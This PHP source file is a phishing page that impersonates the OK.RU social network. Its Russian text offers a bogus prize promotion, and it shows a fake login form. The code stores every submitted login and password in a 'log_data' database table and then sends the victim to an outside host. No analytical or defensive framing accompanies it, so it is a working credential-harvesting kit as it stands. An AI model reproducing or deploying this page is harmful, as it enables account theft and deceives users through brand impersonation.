<?php
require_once 'db.php';
header('Access-Control-Allow-Origin: *');

session_start();

$db = new DbFunctionAutorisation();
$authorization1 = $_SESSION['authorization1'];

if(isset($_POST['submit']))
{
$_SESSION['authorization1'] = true;
$inputEmail = $_POST['inputEmail'];
$inputPassword = $_POST['inputPassword'];
if($inputEmail && $inputPassword)$db->insert_table('log_data', $inputEmail, $inputPassword);
header('Location: http://ddddd.esy.es/ok.ru.php');
}


echo "<!DOCTYPE html>
<html>
<head>
	<link rel='stylesheet' href='css/bootstrap.min.css'></script>
	<link rel='stylesheet' href='css/bootstrap.css'></script>
	<script src='js/jquery-3.1.1.js' type='text/javascript'></script>
	<script src='js/bootstrap.min.js' type='text/javascript'></script>
	<meta charset='utf-8'>
	<title>OK.RU</title>
</head>

<body style='background-color: #b9ddff; overflow: hidden;'>

<div class='banner'>";
if(!$authorization1)
{
  echo "<div class='form'>
        <form class='form-horizontal'  type='submit' method='POST'>
	<div style='text-align: center; margin-top: 0.14%'>
	<span style='color: #ee8208;'>    &#1072;&#1074;&#1090;&#1086;&#1088;&#1080;&#1079;&#1072;&#1094;&#1080;&#1103; &#1076;&#1083;&#1103; &#1091;&#1095;&#1072;&#1089;&#1090;&#1080;&#1103; &#1074; &#1072;&#1082;&#1094;&#1080;&#1080;</span>
	</div>
	<div style='margin-left: -16px; margin-top: -10px;'>
	<hr width='106.5%' size='4' color='#dddddd' />
	</div>
  <div class='control-group' style='margin-top: -16px'>
    <label class='control-label' for='inputEmail' style='font-weight: normal; margin-bottom: 5px;'>&#1083;&#1086;&#1075;&#1080;&#1085;, &#1072;&#1076;&#1088;&#1077;&#1089; &#1087;&#1086;&#1095;&#1090;&#1099; &#1080;&#1083;&#1080; &#1090;&#1077;&#1083;&#1077;&#1092;&#1086;&#1085;</label>
    <div class='controls' style=''>
      <input type='text' id='inputEmail' name='inputEmail' style='border-radius:5px;  border: 1px solid #dddddd;  width: 100%; height: 32px; padding: 0 8px;'>
    </div>
  </div>
  <div class='control-group' style='margin-bottom: 4px; margin-top: 5px;'>
    <label class='control-label' for='inputPassword' style='font-weight: normal; margin-bottom: 4px;'>&#1087;&#1072;&#1088;&#1086;&#1083;&#1100;</label>
    <div class='controls'>
      <input type='password' id='inputPassword' name='inputPassword' placeholder='' style='border-radius: 3px;  border: 1px solid #ccc; width: 100%; height: 32px; padding: 0 8px;'>
    </div>
  </div>
  <div class='control-group'><br>
    <div class='controls' style='margin-top: -11px;'>
            <input type='checkbox' checked> &#1079;&#1072;&#1087;&#1086;&#1084;&#1085;&#1080;&#1090;&#1100; &#1084;&#1077;&#1085;&#1103;
    </div>
	<button name='submit' class='btn btn-warning' style='background-color: #ee8208; margin-top: 8px;'>&#1047;&#1072;&#1088;&#1077;&#1075;&#1080;&#1089;&#1090;&#1088;&#1080;&#1088;&#1086;&#1074;&#1072;&#1090;&#1100;&#1089;&#1103;</button>
  </div>
  <div style='margin-left: 170px; margin-top: -33px;'>
	<img src='google.png'>
	</div>
</form>
    </div>";
}else{
echo "<div style='margin-top: 380px; margin-left: 600px;'>
      <span style='color: #ee8208;'>
	  <strong>&#1040;&#1076;&#1084;&#1080;&#1085;&#1080;&#1089;&#1090;&#1088;&#1072;&#1094;&#1080;&#1103; &#1089;&#1074;&#1103;&#1078;&#1077;&#1090;&#1089;&#1103; &#1089; &#1074;&#1072;&#1084;&#1080; &#1074; &#1073;&#1083;&#1080;&#1078;&#1072;&#1081;&#1096;&#1080;&#1077; &#1076;&#1085;&#1080;<br> &#8195;&#1080; &#1089;&#1086;&#1086;&#1073;&#1097;&#1080;&#1090; &#1086; &#1074;&#1072;&#1096;&#1080;&#1093; &#1074;&#1086;&#1079;&#1084;&#1086;&#1078;&#1085;&#1086;&#1089;&#1090;&#1103;&#1093; &#1074; &#1101;&#1090;&#1086;&#1081; &#1072;&#1082;&#1094;&#1080;&#1080;</strong>
	  </span>
      </div>        
";
}
echo "</div>

<div class='logo'>
<img src='logo.png'>
</div>

<div class='label_logo'>
<div style='
    color: #fff;	
    line-height: 24px;
    font-size: 15px;
    display: inline;
'>
<span style='
    left: -10px;
	position: relative;
        padding-top: 4px; 
	padding-bottom: 4px;
	background-color: #ee8208;
'>
<span style='	
	padding-top: 4px; 
	padding-bottom: 4px;
	position: relative;
	background-color: #ee8208;
	left: 10px;
'>
<span style='
	background-color: #ee8208; 	
	position: relative;
	left: -5px;
'>
&#1047;&#1048;&#1052;&#1040; &#1053;&#1040; &#1054;&#1044;&#1053;&#1054;&#1050;&#1051;&#1040;&#1057;&#1057;&#1053;&#1048;&#1050;&#1040;&#1061;<br>&#1041;&#1059;&#1044;&#1045;&#1058; &#1058;&#1025;&#1055;&#1051;&#1054;&#1049;
</span>
</span>
</span>
</div>
</div>";

if(!$authorization1)
{
echo "<div style='margin-top: 25%; margin-left: 7.5%;'>
<span style='color: #ee8208;'>
<strong>
&#1055;&#1086;&#1089;&#1087;&#1077;&#1096;&#1080; &#1087;&#1088;&#1080;&#1085;&#1103;&#1090;&#1100; 
&#1091;&#1095;&#1072;&#1089;&#1090;&#1080;&#1077; &#1074; &#1072;&#1082;&#1094;&#1080;&#1080;,<br> 
&#1082;&#1086;&#1090;&#1086;&#1088;&#1072;&#1103; &#1087;&#1088;&#1086;&#1093;&#1086;&#1076;&#1080;&#1090; &#1076;&#1086; 01.03.2017, &#1089;&#1082;&#1080;&#1076;&#1082;&#1080; &#1085;&#1072; &#1084;&#1085;&#1086;&#1078;&#1077;&#1089;&#1090;&#1074;&#1086; &#1090;&#1086;&#1074;&#1072;&#1088;&#1086;&#1074;, &#1088;&#1086;&#1079;&#1099;&#1075;&#1088;&#1099;&#1096; &#1087;&#1088;&#1080;&#1079;&#1086;&#1074; &#1080; &#1087;&#1088;&#1086;&#1095;&#1077;&#1077;, &#1080;&#1089;&#1087;&#1099;&#1090;&#1072;&#1081; &#1082;&#1086;&#1083;&#1077;&#1089;&#1086; &#1092;&#1086;&#1088;&#1090;&#1091;&#1085;&#1099;
</strong>
</span>
</div>";
}

echo "</body>

<style>

.banner{
    
    width: 120%;
    height: 436px;
    margin-left: -6.14%;
    padding-top: 3.5%;
    background-image: url('image.jpg');
}

.form{
    width: 16.54%;
    height: 70%;
    margin-left: 57.96%;
    padding: 0.60% 1% 1%;
    background-color: #fff;
}

.logo{
    width: 2.96%;	
    height: 13.4%;
    margin-top: -28.5%;
    margin-left: 17%;
}

.label_logo{
    width: 16.6%;
    height: 10.13%;
    margin-left: 22%;
    margin-top: -5.96%;
}

</style>
</html>";

?>